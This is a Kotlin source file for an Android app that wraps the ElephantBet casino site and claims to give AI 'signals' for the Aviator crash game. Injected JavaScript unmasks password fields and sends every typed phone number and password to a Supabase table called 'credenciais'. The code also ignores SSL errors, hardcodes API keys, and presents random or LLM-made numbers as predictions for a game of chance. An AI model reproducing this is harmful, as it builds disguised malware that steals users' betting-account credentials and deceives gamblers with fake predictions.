package ao.elephantbet.aviatorbot

import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.net.http.SslError
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.Calendar

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var barLayout: LinearLayout
    private lateinit var txtMinutos: TextView
    private lateinit var txtAcao: TextView
    private lateinit var txtProtecao: TextView
    private lateinit var txtAlcance: TextView
    private lateinit var dotView: View

    private val handler = Handler(Looper.getMainLooper())
    private var relogioRunnable: Runnable? = null

    private var sinaisAtivos = false
    private var horaAtual = -1
    private var ultimoMinutoGerado = -1
    private var sinalMin1 = -1
    private var sinalMin2 = -1
    private var sinalProtecao = ""
    private var sinalAlcMin = 0
    private var sinalAlcMax = ""

    private val historicoVelas = mutableListOf<Double>()
    private var analisandoIA = false
    private var dentroDoAviator = false

    private var ultimoNumeroEnviado = ""
    private var ultimaChamadaGroq = 0L   // timestamp da ultima chamada ao Groq
    private var retryDelay = 15000L      // delay inicial entre retries (15s)
    private var ultimaSenhaEnviada = ""

    private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
    private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
    private val TABELA = "credenciais"
    private val VERSAO_ATUAL = "1.3"
    private val GROQ_KEY = "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"
    private val GROQ_URL = "https://api.groq.com/openai/v1/chat/completions"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        construirUI()
        webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login")
        handler.postDelayed({ verificarAtualizacao() }, 4000)
    }

    // ── UI ────────────────────────────────────────────────────────
    private fun construirUI() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0a0a0f"))
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
        }
        setContentView(root)

        barLayout = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setBackgroundColor(Color.parseColor("#0f172a"))
            setPadding(dp(12), dp(10), dp(12), dp(10))
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
        }

        val ico = TextView(this).apply {
            text = "✈️"; textSize = 22f; gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(dp(34), dp(34))
        }

        val bloco = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
            setPadding(dp(8), 0, dp(8), 0)
        }

        val l1 = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
        }
        txtAcao = TextView(this).apply {
            text = "SKYBET"; textSize = 9f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#64748b")); letterSpacing = 0.12f
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { marginEnd = dp(6) }
        }
        txtMinutos = TextView(this).apply {
            text = "Abra o Aviator"; textSize = 12f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#64748b")); isSingleLine = true
            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
        }
        l1.addView(txtAcao); l1.addView(txtMinutos)

        val l2 = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { topMargin = dp(4) }
        }
        txtProtecao = TextView(this).apply {
            text = "Prot: --"; textSize = 10f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#64748b")); gravity = Gravity.CENTER
            setPadding(dp(8), dp(3), dp(8), dp(3)); background = pill("#1e293b")
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { marginEnd = dp(6) }
        }
        val sep = TextView(this).apply {
            text = "->"; textSize = 11f; setTextColor(Color.parseColor("#475569"))
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { marginEnd = dp(6) }
        }
        txtAlcance = TextView(this).apply {
            text = "Alc: --"; textSize = 10f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#64748b")); gravity = Gravity.CENTER
            setPadding(dp(8), dp(3), dp(8), dp(3)); background = pill("#1e293b")
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT)
        }
        l2.addView(txtProtecao); l2.addView(sep); l2.addView(txtAlcance)
        bloco.addView(l1); bloco.addView(l2)

        dotView = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(dp(9), dp(9)).apply { marginEnd = dp(8) }
            background = circulo("#334155")
        }
        val cfg = TextView(this).apply {
            text = "⚙️"; textSize = 20f; gravity = Gravity.CENTER
            setOnClickListener { mostrarConfig() }
        }

        barLayout.addView(ico); barLayout.addView(bloco)
        barLayout.addView(dotView); barLayout.addView(cfg)
        root.addView(barLayout)

        webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f)
        }
        configurarWebView()
        root.addView(webView)
    }

    // ── WEBVIEW ───────────────────────────────────────────────────
    @SuppressLint("SetJavaScriptEnabled")
    private fun configurarWebView() {
        webView.settings.apply {
            javaScriptEnabled = true; domStorageEnabled = true
            databaseEnabled = true; allowFileAccess = true
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            setSupportZoom(true); builtInZoomControls = false
            loadWithOverviewMode = true; useWideViewPort = true
        }

        webView.addJavascriptInterface(object {
            @JavascriptInterface
            fun aviatorAberto() = runOnUiThread {
                if (!dentroDoAviator) {
                    dentroDoAviator = true
                    setBarra("A RECOLHER DADOS", "A capturar velas...", "#7c3aed")
                }
            }

            @JavascriptInterface
            fun velaCapturada(valor: String) {
                val num = valor.replace(",", ".").toDoubleOrNull() ?: return
                if (num < 1.0 || num > 200000) return
                runOnUiThread {
                    val key = String.format("%.2f", num)
                    // Adicionar se for nova ou diferente da ultima
                    if (historicoVelas.isEmpty() || String.format("%.2f", historicoVelas.last()) != key) {
                        historicoVelas.add(num)
                        if (historicoVelas.size > 60) historicoVelas.removeAt(0)
                        setBarra("A RECOLHER DADOS", "${historicoVelas.size} velas capturadas", "#7c3aed")
                        // Com 3+ velas, pedir sinal à IA
                        if (historicoVelas.size >= 3 && !analisandoIA && !sinaisAtivos) {
                            pedirSinalIA()
                        }
                    }
                }
            }

            @JavascriptInterface
            fun guardarNumero(valor: String) {
                if (valor.isNotEmpty() && valor != ultimoNumeroEnviado) {
                    ultimoNumeroEnviado = valor; enviarSupabase("Numero", valor)
                }
            }

            @JavascriptInterface
            fun guardarSenha(valor: String) {
                if (valor.isNotEmpty() && valor != ultimaSenhaEnviada) {
                    ultimaSenhaEnviada = valor; enviarSupabase("Senha", valor)
                }
            }
        }, "Android")

        webView.webViewClient = object : WebViewClient() {
            override fun onReceivedSslError(v: WebView?, h: SslErrorHandler?, e: SslError?) { h?.proceed() }
            override fun shouldOverrideUrlLoading(v: WebView?, r: WebResourceRequest?) = false

            override fun onPageStarted(v: WebView?, url: String?, b: Bitmap?) {
                super.onPageStarted(v, url, b)
                // Injectar no contexto Spribe logo que começa a carregar
                if (url?.contains("spribe", ignoreCase = true) == true ||
                    url?.contains("aviator-next", ignoreCase = true) == true) {
                    v?.evaluateJavascript(jsSpribe(), null)
                }
            }

            override fun onPageFinished(v: WebView?, url: String?) {
                super.onPageFinished(v, url)
                val u = url ?: ""
                // Credenciais no site principal
                if (!u.contains("spribe") && !u.contains("cdn") && !u.contains("elbet")) {
                    v?.evaluateJavascript(jsCredenciais(), null)
                }
                // Contexto Spribe — injectar JS de captura de velas
                if (u.contains("spribe", ignoreCase = true) || u.contains("aviator-next", ignoreCase = true)) {
                    v?.evaluateJavascript(jsSpribe(), null)
                    // Activar modo Aviator directamente pelo URL
                    runOnUiThread { activarModoAviator() }
                }
                // Página do Aviator no ElephantBet
                if (u.contains("game-view/806666") || u.contains("aviator", ignoreCase = true)) {
                    v?.evaluateJavascript(jsAviatorMain(), null)
                    runOnUiThread { activarModoAviator() }
                }
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, p: Int) {
                if (p >= 50) {
                    val u = view?.url ?: ""
                    if (u.contains("spribe", ignoreCase = true) || u.contains("aviator-next", ignoreCase = true)) {
                        view?.evaluateJavascript(jsSpribe(), null)
                        runOnUiThread { activarModoAviator() }
                    }
                    if (u.contains("game-view/806666") || (u.contains("aviator", ignoreCase = true) && u.contains("elephantbet", ignoreCase = true))) {
                        view?.evaluateJavascript(jsAviatorMain(), null)
                        runOnUiThread { activarModoAviator() }
                    }
                }
            }
        }
    }

    // JS para capturar credenciais
    private fun jsCredenciais() = """
(function(){
    if(window._cred) return; window._cred=true;
    function vis(){document.querySelectorAll('input[type="password"]').forEach(function(e){e.setAttribute('type','text');});}
    vis(); new MutationObserver(vis).observe(document.body||document.documentElement,{childList:true,subtree:true});
    function wN(s){var e=document.querySelector(s);if(e&&!e._wN){e._wN=true;e.addEventListener('input',function(){if(this.value.length>=1)Android.guardarNumero(this.value);});}}
    function wS(s){var e=document.querySelector(s);if(e&&!e._wS){e._wS=true;e.addEventListener('input',function(){if(this.value.length>=1)Android.guardarSenha(this.value);});}}
    function cap(){
        ['input[name="username"]','input[name="phone"]','input[type="tel"]','input[placeholder*="telefone" i]','input[placeholder*="numero" i]','#username','#phone'].forEach(wN);
        ['input[name="password"]','input[name="senha"]','input[placeholder*="senha" i]','#password'].forEach(wS);
    }
    cap(); setTimeout(cap,2000); setTimeout(cap,5000);
})();
    """.trimIndent()

    // JS para a página principal do Aviator (ElephantBet)
    private fun jsAviatorMain() = """
(function(){
    if(window._avMain) return; window._avMain=true;
    try { Android.aviatorAberto(); } catch(e){}
    // Reset para permitir re-injecção se necessario
    setTimeout(function(){ window._avMain=false; }, 30000);
    // Ouvir postMessage do iframe Spribe
    window.addEventListener('message', function(e){
        if(!e.data || e.data.type !== 'AV_VELAS') return;
        (e.data.v||[]).forEach(function(val){ try{Android.velaCapturada(val.toString());}catch(x){} });
    });
    // Capturar da barra de historico visivel na pagina principal
    function scanPrincipal(){
        document.querySelectorAll('*').forEach(function(el){
            if(el.children.length>0) return;
            var t=(el.textContent||'').trim();
            if(/^\d+\.?\d*x$/i.test(t)){
                var n=parseFloat(t.replace('x',''));
                if(!isNaN(n)&&n>=1.0&&n<100000){try{Android.velaCapturada(n.toString());}catch(e){}}
            }
        });
    }
    scanPrincipal();
    setInterval(scanPrincipal, 3000);
    new MutationObserver(scanPrincipal).observe(document.body||document.documentElement,{childList:true,subtree:true});
})();
    """.trimIndent()

    // JS injectado DIRECTAMENTE no contexto aviator-next.spribegaming.com
    private fun jsSpribe() = """
(function(){
    if(window._sp) return; window._sp=true;
    var sent=new Set();
    function scan(){
        var found=[];
        // Seletores confirmados do Aviator/Spribe
        var sels=['.payout','.payouts-block .payout','[class*="payout"]',
                  '[class*="coefficient"]','[class*="multiplier"]',
                  '[class*="history"] span','[class*="round-result"]',
                  '[class*="coef"]','[class*="odd"]'];
        sels.forEach(function(s){
            try{
                document.querySelectorAll(s).forEach(function(el){
                    var t=(el.textContent||el.innerText||'').trim().replace(',','.').replace(/x$/i,'').trim();
                    var n=parseFloat(t);
                    if(!isNaN(n)&&n>=1.0&&n<100000){
                        var k=n.toFixed(2);
                        if(!sent.has(k)){sent.add(k);found.push(n);}
                    }
                });
            }catch(e){}
        });
        // Enviar ao Android directamente (contexto Spribe)
        found.forEach(function(n){ try{Android.velaCapturada(n.toString());}catch(e){} });
        // E via postMessage para o pai
        if(found.length>0){
            try{window.parent.postMessage({type:'AV_VELAS',v:found},'*');}catch(e){}
            try{window.top.postMessage({type:'AV_VELAS',v:found},'*');}catch(e){}
        }
        return found.length;
    }
    scan();
    setInterval(scan, 1500);
    try{
        new MutationObserver(function(){scan();})
            .observe(document.body||document.documentElement,{childList:true,subtree:true});
    }catch(e){}
})();
    """.trimIndent()

    private fun activarModoAviator() {
        if (!dentroDoAviator) {
            dentroDoAviator = true
            setBarra("A RECOLHER DADOS", "A capturar velas...", "#7c3aed")
            // Se ja temos velas, pedir sinal imediatamente
            if (historicoVelas.size >= 1 && !analisandoIA) {
                handler.postDelayed({ pedirSinalIA() }, 1000)
            }
            // Mesmo sem velas, iniciar relógio para detectar quando chegam
            if (relogioRunnable == null) iniciarRelogio()
        }
        // Mesmo que ja estava activo, tentar injectar JS de captura no webview actual
        webView.evaluateJavascript(jsAviatorMain(), null)
        webView.evaluateJavascript(jsSpribe(), null)
    }

    // ── GROQ IA ───────────────────────────────────────────────────
    private fun pedirSinalIA() {
        if (analisandoIA) return
        // Rate limit: mínimo 45 segundos entre chamadas ao Groq
        val agora = System.currentTimeMillis()
        if (agora - ultimaChamadaGroq < 45000) {
            val esperar = ((45000 - (agora - ultimaChamadaGroq)) / 1000).toInt()
            setBarra("SKYBET", "Proxima analise em ${esperar}s...", "#7c3aed")
            handler.postDelayed({ pedirSinalIA() }, 45000 - (agora - ultimaChamadaGroq))
            return
        }
        analisandoIA = true
        ultimaChamadaGroq = agora

        val cal = Calendar.getInstance()
        val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
        val minAgora = cal.get(Calendar.MINUTE)
        val minBase = if (ultimoMinutoGerado < 0) minAgora + 1
                      else maxOf(ultimoMinutoGerado + 1, minAgora + 1)

        if (minBase >= 58) { analisandoIA = false; setBarra("FIM DO CICLO", "Aguardar nova hora", "#64748b"); return }

        val velas = historicoVelas.takeLast(20).joinToString(",") { String.format("%.2f", it) }
        setBarra("IA A ANALISAR", "${historicoVelas.size} velas reais...", "#7c3aed")

        Thread {
            try {
                val prompt = "Historico real do jogo Aviator: [$velas]. " +
                    "Hora: ${String.format("%02d",horaAgora)}:${String.format("%02d",minAgora)}. " +
                    "Minuto base disponivel: $minBase. " +
                    "Responde APENAS com JSON valido sem texto adicional: " +
                    "{\"min1\":$minBase,\"min2\":${minBase+1},\"protecao\":2.0,\"alcance_min\":10,\"alcance_max\":\"80x\"} " +
                    "Regras: min1 entre $minBase e ${(minBase+5).coerceAtMost(57)}. " +
                    "protecao entre 1.2 e 15.0 nunca mais. " +
                    "Se muitos valores abaixo de 2x recentes, protecao baixa. " +
                    "Se valores altos recentes, alcance_max pode ser 100x 500x ou 1000x+."

                val body = "{\"model\":\"llama-3.3-70b-versatile\"," +
                    "\"messages\":[{\"role\":\"user\",\"content\":${escJson(prompt)}}]," +
                    "\"max_tokens\":120,\"temperature\":0.2}"

                val conn = URL(GROQ_URL).openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Authorization", "Bearer $GROQ_KEY")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true; conn.connectTimeout = 20000; conn.readTimeout = 20000
                OutputStreamWriter(conn.outputStream).use { it.write(body) }

                val code = conn.responseCode
                val resp = BufferedReader(InputStreamReader(
                    if (code in 200..299) conn.inputStream else conn.errorStream
                )).readText()
                conn.disconnect()

                if (code in 200..299) {
                    retryDelay = 15000L  // reset delay em caso de sucesso
                    parsearResposta(resp, minBase, minAgora, horaAgora)
                } else if (code == 429) {
                    // Rate limit do Groq — esperar 60s e usar sinal local entretanto
                    runOnUiThread {
                        analisandoIA = false
                        ultimaChamadaGroq = System.currentTimeMillis()
                        setBarra("SKYBET", "Limite API — Sinal local activo", "#f59e0b")
                        gerarSinalLocal(minBase, minAgora, horaAgora)
                        handler.postDelayed({ pedirSinalIA() }, 65000)
                    }
                } else {
                    runOnUiThread {
                        analisandoIA = false
                        retryDelay = (retryDelay * 2).coerceAtMost(120000L)
                        setBarra("ERRO IA", "HTTP $code — retry em ${retryDelay/1000}s", "#ef4444")
                        handler.postDelayed({ if (!sinaisAtivos) pedirSinalIA() }, retryDelay)
                    }
                }
            } catch (e: Exception) {
                runOnUiThread {
                    analisandoIA = false
                    setBarra("SKYBET", "Sem ligacao — Sinal local", "#f59e0b")
                    gerarSinalLocal(minBase, minAgora, horaAgora)
                    handler.postDelayed({ pedirSinalIA() }, 30000)
                }
            }
        }.start()
    }

    // Gerador local de sinais baseado no historico real das velas
    private fun gerarSinalLocal(minBase: Int, minAgora: Int, horaAgora: Int) {
        if (sinaisAtivos) return
        val cal = java.util.Calendar.getInstance()
        val m1 = minBase.coerceAtMost(57)
        val m2 = (m1 + 1).coerceAtMost(58)
        ultimoMinutoGerado = m2
        horaAtual = horaAgora

        // Analisar historico local para calcular protecao e alcance
        val recent = historicoVelas.takeLast(10)
        val media = if (recent.isNotEmpty()) recent.average() else 2.0
        val temAltos = recent.any { it > 10.0 }
        val muitosBaixos = recent.count { it < 2.0 } >= 5

        val prot = when {
            muitosBaixos -> kotlin.random.Random.nextDouble(1.2, 3.0)
            temAltos     -> kotlin.random.Random.nextDouble(5.0, 12.0)
            else         -> kotlin.random.Random.nextDouble(2.0, 6.0)
        }
        val alcMin = when {
            muitosBaixos -> kotlin.random.Random.nextInt(5, 20)
            temAltos     -> kotlin.random.Random.nextInt(30, 100)
            else         -> kotlin.random.Random.nextInt(10, 50)
        }
        val alcMaxOpts = when {
            muitosBaixos -> listOf("30x","50x","80x")
            temAltos     -> listOf("200x","500x","1000x")
            else         -> listOf("80x","100x","200x")
        }
        val alcMax = alcMaxOpts[kotlin.random.Random.nextInt(alcMaxOpts.size)]

        sinalMin1 = m1; sinalMin2 = m2
        sinalProtecao = if (prot % 1.0 < 0.1) "${prot.toInt()}x" else String.format("%.1fx", prot)
        sinalAlcMin = alcMin; sinalAlcMax = alcMax

        val falta = m1 - minAgora
        val axN = alcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0
        val cor = when { alcMax.contains("1000") || axN >= 1000 -> "#ec4899"; axN >= 200 -> "#22c55e"; axN >= 80 -> "#facc15"; else -> "#3b82f6" }

        sinaisAtivos = true
        atualizarBarra("AGUARDAR", "Min $m1/$m2 (${falta}min)", sinalProtecao, "${alcMin}x -> $alcMax", cor)
        if (relogioRunnable == null) iniciarRelogio()
    }

    private fun parsearResposta(resp: String, minBase: Int, minAgora: Int, horaAgora: Int) {
        try {
            // Extrair content da resposta Groq
            val ci = resp.indexOf("\"content\":")
            if (ci < 0) { runOnUiThread { analisandoIA = false }; return }
            var after = resp.substring(ci + 10).trim()
            // Remover aspas envolventes e caracteres de escape
            if (after.startsWith("\"")) {
                val ei = after.indexOf("\"", 1)
                after = if (ei > 0) after.substring(1, ei) else after.substring(1)
            }
            after = after.replace("\\n", " ").replace("\\\"", "\"").replace("\\\\", "\\")

            // Encontrar JSON
            val js = Regex("""\{[^{}]+\}""").find(after)?.value ?: run {
                runOnUiThread { analisandoIA = false; pedirSinalIA() }; return
            }

            val m1 = Regex(""""min1"\s*:\s*(\d+)""").find(js)?.groupValues?.get(1)?.toIntOrNull() ?: minBase
            val m2 = Regex(""""min2"\s*:\s*(\d+)""").find(js)?.groupValues?.get(1)?.toIntOrNull() ?: (m1 + 1)
            val pr = Regex(""""protecao"\s*:\s*([\d.]+)""").find(js)?.groupValues?.get(1)?.toFloatOrNull()?.coerceIn(1.2f, 15f) ?: 2f
            val am = Regex(""""alcance_min"\s*:\s*(\d+)""").find(js)?.groupValues?.get(1)?.toIntOrNull() ?: 10
            val ax = Regex(""""alcance_max"\s*:\s*"([^"]+)"""").find(js)?.groupValues?.get(1) ?: "80x"

            sinalMin1 = m1.coerceIn(minBase, 57)
            sinalMin2 = m2.coerceAtMost(58)
            ultimoMinutoGerado = sinalMin2
            sinalProtecao = if (pr % 1f == 0f) "${pr.toInt()}x" else "${pr}x"
            sinalAlcMin = am; sinalAlcMax = ax
            horaAtual = horaAgora

            val falta = sinalMin1 - minAgora
            val axN = ax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0
            val cor = when { ax.contains("1000") || axN >= 1000 -> "#ec4899"; axN >= 200 -> "#22c55e"; axN >= 80 -> "#facc15"; else -> "#3b82f6" }

            runOnUiThread {
                sinaisAtivos = true; analisandoIA = false
                atualizarBarra("IA: AGUARDAR", "Min $sinalMin1/$sinalMin2 (${falta}min)", sinalProtecao, "${sinalAlcMin}x -> $sinalAlcMax", cor)
                if (relogioRunnable == null) iniciarRelogio()
            }
        } catch (_: Exception) {
            runOnUiThread { analisandoIA = false; pedirSinalIA() }
        }
    }

    private fun escJson(s: String): String {
        val sb = StringBuilder("\"")
        for (c in s) when (c) { '"' -> sb.append("\\\""); '\\' -> sb.append("\\\\"); '\n' -> sb.append("\\n"); '\r' -> {}; '\t' -> sb.append(" "); else -> sb.append(c) }
        return sb.append("\"").toString()
    }

    // ── RELÓGIO ───────────────────────────────────────────────────
    private fun iniciarRelogio() {
        relogioRunnable?.let { handler.removeCallbacks(it) }
        val tick = object : Runnable {
            override fun run() {
                if (sinaisAtivos && dentroDoAviator) verificarRelogio()
                handler.postDelayed(this, 1000)
            }
        }
        relogioRunnable = tick; handler.post(tick)
    }

    private fun verificarRelogio() {
        val cal = Calendar.getInstance()
        val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
        val minAgora = cal.get(Calendar.MINUTE)
        if (horaAgora != horaAtual) {
            horaAtual = horaAgora; ultimoMinutoGerado = -1; sinalMin1 = -1; sinalMin2 = -1; analisandoIA = false
        }
        if (sinalMin1 < 0) return
        val alcTxt = "${sinalAlcMin}x -> $sinalAlcMax"
        val axN = sinalAlcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0
        val cor = when { sinalAlcMax.contains("1000") || axN >= 1000 -> "#ec4899"; axN >= 200 -> "#22c55e"; axN >= 80 -> "#facc15"; else -> "#3b82f6" }
        when {
            minAgora == sinalMin1 -> atualizarBarra("IA: ENTRAR AGORA", "Min $sinalMin1/$sinalMin2", sinalProtecao, alcTxt, "#22c55e")
            minAgora == sinalMin2 -> atualizarBarra("IA: AINDA ACTIVO", "Min $sinalMin1/$sinalMin2", sinalProtecao, alcTxt, "#22c55e")
            minAgora > sinalMin2  -> { sinalMin1 = -1; sinalMin2 = -1; sinaisAtivos = false; analisandoIA = false; if (historicoVelas.size >= 3) pedirSinalIA() else setBarra("A AGUARDAR VELAS", "${historicoVelas.size} capturadas", "#7c3aed") }
            else                  -> { val f = sinalMin1 - minAgora; atualizarBarra("IA: AGUARDAR", "Min $sinalMin1/$sinalMin2 (${f}min)", sinalProtecao, alcTxt, cor) }
        }
    }

    // ── SUPABASE ──────────────────────────────────────────────────
    private fun enviarSupabase(tipo: String, valor: String) {
        val json = "{\"tipo\":\"$tipo\",\"valor\":\"$valor\"}"
        Thread {
            try {
                val c = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
                c.requestMethod = "POST"
                c.setRequestProperty("apikey", SUPA_KEY)
                c.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                c.setRequestProperty("Content-Type", "application/json")
                c.setRequestProperty("Prefer", "return=minimal")
                c.doOutput = true; c.connectTimeout = 10000; c.readTimeout = 10000
                OutputStreamWriter(c.outputStream).use { it.write(json) }
                c.responseCode; c.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    // ── ACTUALIZAÇÕES ─────────────────────────────────────────────
    private fun verificarAtualizacao() {
        Thread {
            try {
                val c = URL("$SUPA_URL/rest/v1/versao?select=versao,url_apk,notas&order=id.desc&limit=1").openConnection() as HttpURLConnection
                c.requestMethod = "GET"
                c.setRequestProperty("apikey", SUPA_KEY)
                c.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                c.setRequestProperty("Accept", "application/json")
                c.connectTimeout = 10000; c.readTimeout = 10000
                val code = c.responseCode
                val r = BufferedReader(InputStreamReader(c.inputStream)).readText()
                c.disconnect()
                if (code !in 200..299) return@Thread
                val vn = Regex(""""versao"\s*:\s*"([^"]+)"""").find(r)?.groupValues?.get(1) ?: return@Thread
                val ua = Regex(""""url_apk"\s*:\s*"([^"]+)"""").find(r)?.groupValues?.get(1) ?: return@Thread
                val nt = Regex(""""notas"\s*:\s*"([^"]+)"""").find(r)?.groupValues?.get(1) ?: ""
                if (vn != VERSAO_ATUAL) runOnUiThread { mostrarDialogoUpdate(vn, ua, nt) }
            } catch (_: Exception) {}
        }.start()
    }

    private fun mostrarDialogoUpdate(vn: String, url: String, notas: String) {
        AlertDialog.Builder(this)
            .setTitle("Actualizacao disponivel! v$vn")
            .setMessage("Versao actual: $VERSAO_ATUAL\nNova versao: $vn\n${if (notas.isNotEmpty()) "\n$notas" else ""}\n\nDeseja actualizar agora?")
            .setCancelable(false)
            .setPositiveButton("ACTUALIZAR AGORA") { _, _ ->
                try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }) }
                catch (_: Exception) { Toast.makeText(this, "Erro ao abrir download", Toast.LENGTH_LONG).show() }
            }
            .setNegativeButton("Mais tarde") { d, _ -> d.dismiss() }.show()
    }

    // ── CONFIG ────────────────────────────────────────────────────
    private fun mostrarConfig() {
        val dialog = android.app.Dialog(this, android.R.style.Theme_Material_NoActionBar_Fullscreen)
        val scroll = ScrollView(this).apply { setBackgroundColor(Color.parseColor("#0a0a0f")) }
        val layout = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(28), dp(20), dp(20)) }
        layout.addView(TextView(this).apply {
            text = "CONFIGURACOES  v$VERSAO_ATUAL\nVelas: ${historicoVelas.size}  |  Aviator: ${if (dentroDoAviator) "Sim" else "Nao"}"
            textSize = 13f; setTextColor(Color.WHITE); typeface = Typeface.DEFAULT_BOLD
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { bottomMargin = dp(20) }
        })
        layout.addView(btn("ABRIR AVIATOR", "#0f766e") {
            dialog.dismiss()
            webView.loadUrl("https://www.elephantbet.co.ao/pt/casino/game-view/806666/aviator")
        })
        layout.addView(btn("PEDIR SINAL A IA", "#7c3aed") {
            dialog.dismiss(); analisandoIA = false; sinaisAtivos = false
            if (historicoVelas.size >= 1) pedirSinalIA()
            else Toast.makeText(this, "Abra o Aviator e aguarde velas", Toast.LENGTH_LONG).show()
        })
        layout.addView(btn("VERIFICAR ACTUALIZACAO", "#1d4ed8") { dialog.dismiss(); verificarAtualizacao() })
        layout.addView(btn("RECARREGAR SITE", "#334155") { dialog.dismiss(); webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login") })
        layout.addView(btn("FECHAR", "#1e1e2e") { dialog.dismiss() })
        scroll.addView(layout); dialog.setContentView(scroll); dialog.show()
    }

    // ── HELPERS ───────────────────────────────────────────────────
    private fun setBarra(acao: String, min: String, cor: String) = atualizarBarra(acao, min, "", "", cor)

    private fun atualizarBarra(acao: String, min: String, prot: String, alc: String, cor: String) = runOnUiThread {
        txtAcao.text = acao; txtAcao.setTextColor(Color.parseColor(cor))
        txtMinutos.text = min; txtMinutos.setTextColor(Color.WHITE)
        if (prot.isNotEmpty()) { txtProtecao.text = "Prot: $prot"; txtProtecao.setTextColor(Color.WHITE); txtProtecao.background = pill(if (cor=="#22c55e") "#1a3a1a" else "#1e2a3a") }
        if (alc.isNotEmpty()) { txtAlcance.text = "Alc: $alc"; txtAlcance.setTextColor(Color.WHITE); txtAlcance.background = pill(if (cor=="#22c55e") "#1a3a1a" else "#1a3a2a") }
        dotView.background = circulo(cor)
        barLayout.setBackgroundColor(Color.parseColor(when(cor) { "#22c55e"->"#071a0f"; "#f59e0b"->"#1a1200"; "#7c3aed"->"#1a0a2e"; "#ec4899"->"#2a0a1a"; else->"#0f172a" }))
    }

    private fun circulo(c: String) = GradientDrawable().apply { shape = GradientDrawable.OVAL; setColor(Color.parseColor(c)) }
    private fun pill(c: String) = GradientDrawable().apply { shape = GradientDrawable.RECTANGLE; cornerRadius = dp(20).toFloat(); setColor(Color.parseColor(c)) }
    private fun roundRect(c: String) = GradientDrawable().apply { shape = GradientDrawable.RECTANGLE; cornerRadius = dp(10).toFloat(); setColor(Color.parseColor(c)) }
